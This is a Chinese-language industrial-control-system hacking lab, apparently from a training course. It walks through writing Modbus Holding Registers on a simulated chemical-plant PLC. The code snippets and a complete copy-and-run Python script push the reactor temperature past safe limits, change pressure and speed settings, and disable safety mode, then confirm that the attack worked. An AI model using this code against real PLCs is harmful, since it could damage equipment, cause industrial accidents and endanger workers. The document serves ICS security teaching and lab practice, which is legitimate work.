# LAB 2 - 寫入暫存器遠端控制

## 滲透場景

經過 Lab 0 的資訊蒐集階段，你已經成功讀取了化工廠 PLC 的 Holding Registers，了解了當前的製程參數。現在是時候進入攻擊的第二階段：**主動控制**。

透過寫入 Holding Registers，你可以直接修改 PLC 的關鍵設定值，例如反應爐溫度上限、壓力閾值或安全模式狀態。這種攻擊手法在真實的工控入侵事件中極為常見，攻擊者可能會：
- 修改安全閾值導致設備過載
- 改變製程參數影響產品品質
- 觸發緊急停機造成生產中斷

## 寫入操作的危險性

與被動的讀取操作不同，寫入 Holding Registers 會直接影響工控系統的運作狀態：

| 風險等級 | 攻擊後果 | 實際影響 |
|----------|----------|----------|
| **高風險** | 修改安全參數 | 設備損壞、人員安全 |
| **中風險** | 調整製程設定 | 產品品質、生產效率 |
| **低風險** | 變更監控數值 | 資訊混淆、誤判 |

## 寫入操作實作

### 寫入單一 Holding Register
使用 write_single_register() 方法可以修改特定位址的暫存器值。此方法對應 Modbus Function Code 6：

```python
# 修改位址 0 的暫存器值為 850 (85.0°C)
result = client.write_single_register(0, 850, unit=1)
print(f"寫入結果: {result}")
```

### 批量寫入多個 Registers
write_multiple_registers() 方法允許一次寫入多個連續的暫存器，對應 Function Code 16，適合大量參數調整：

```python
# 一次寫入多個設定值
new_values = [800, 150, 1, 2500]  # 溫度、壓力、安全模式、轉速
result = client.write_multiple_registers(0, new_values, unit=1)
```

### 寫入前的安全檢查
在執行寫入前，建議先讀取當前值進行備份，以便必要時還原：

```python
# 備份原始值
original_values = client.read_holding_registers(0, 4, unit=1)
print(f"原始值: {original_values}")

# 執行寫入
client.write_single_register(0, 950, unit=1)
```

### 驗證寫入結果
寫入完成後應該讀取相同位址來確認操作是否成功：

```python
# 寫入新值
client.write_single_register(2, 0, unit=1)  # 關閉安全模式

# 驗證寫入結果
new_value = client.read_holding_registers(2, 1, unit=1)
if new_value[0] == 0:
    print("[+] 安全模式已成功關閉")
```

### 目標化攻擊範例
針對特定製程參數進行精確攻擊：

```python
# 危險操作：調高反應爐溫度到危險範圍
danger_temp = 1200  # 120.0°C (超過安全範圍)
client.write_single_register(0, danger_temp, unit=1)
print("[!] 警告：溫度設定已調整到危險範圍")
```

## 程式碼重點解析

| 關鍵函式 | 參數說明 | 攻擊效果 |
|----------|----------|----------|
| `write_single_register(0, 850, unit=1)` | 位址 0，寫入值 850，Unit ID 1 | 修改單一參數 |
| `write_multiple_registers(0, values, unit=1)` | 從位址 0 開始批量寫入 | 大規模參數調整 |
| `read_holding_registers(0, 1, unit=1)` | 驗證寫入結果 | 確認攻擊成功 |

## 滲透價值分析

透過寫入 Holding Registers，攻擊者可以：

- **直接控制**：即時修改設備運作參數
- **破壞性攻擊**：調整安全閾值造成設備損壞
- **隱蔽性操作**：微調參數影響產品品質而不易察覺

這種寫入攻擊是工控滲透中最具威脅性的手段，可能造成嚴重的安全事故和經濟損失。

## 完整程式碼範例

以下是完整的程式碼，可以直接複製執行：

```python
from modbus_tcp import ModbusTcpClient
import time

def main():
    # 目標 PLC 資訊
    target_ip = '192.168.56.1'
    target_port = 502
    
    print(f"[*] 連接目標 PLC: {target_ip}:{target_port}")
    
    try:
        # 建立 Modbus TCP 連線
        client = ModbusTcpClient(target_ip, target_port)
        client.open()
        print("[+] 連線建立成功")
        
        # 步驟 1: 讀取當前值作為備份
        print("\n[*] 讀取當前設定值...")
        original_values = client.read_holding_registers(0, 4, unit=1)
        print(f"[+] 原始值: {original_values}")
        
        # 步驟 2: 寫入新的設定值
        print("\n[*] 執行寫入攻擊...")
        
        # 危險操作：調高溫度設定
        new_temp = 1050  # 105.0°C
        result1 = client.write_single_register(0, new_temp, unit=1)
        print(f"[+] 溫度設定寫入: {'成功' if result1 else '失敗'}")
        
        # 批量修改多個參數
        new_settings = [1050, 200, 0, 3000]  # 溫度、壓力、安全模式、轉速
        result2 = client.write_multiple_registers(0, new_settings, unit=1)
        print(f"[+] 批量設定寫入: {'成功' if result2 else '失敗'}")
        
        # 步驟 3: 驗證寫入結果
        print("\n[*] 驗證寫入結果...")
        current_values = client.read_holding_registers(0, 4, unit=1)
        print(f"[+] 當前值: {current_values}")
        
        # 分析影響
        print("\n[!] 攻擊影響分析:")
        print(f"    溫度設定: {original_values[0]} -> {current_values[0]} °C")
        print(f"    壓力設定: {original_values[1]} -> {current_values[1]} bar")
        print(f"    安全模式: {'開啟' if original_values[2] else '關閉'} -> {'開啟' if current_values[2] else '關閉'}")
        print(f"    轉速設定: {original_values[3]} -> {current_values[3]} RPM")
        
        # 檢查危險狀況
        if current_values[0] > 1000:
            print("[!] 警告：溫度設定過高，可能造成設備損壞!")
        if current_values[2] == 0:
            print("[!] 警告：安全模式已關閉，系統處於危險狀態!")
            
        # 關閉連線
        client.close()
        print("\n[*] 連線已關閉")
        
    except Exception as e:
        print(f"[-] 發生錯誤: {e}")

if __name__ == "__main__":
    main()
```

將以上程式碼儲存為 `modbus_write.py`，然後執行：
```bash
python modbus_write.py
```

## 答題區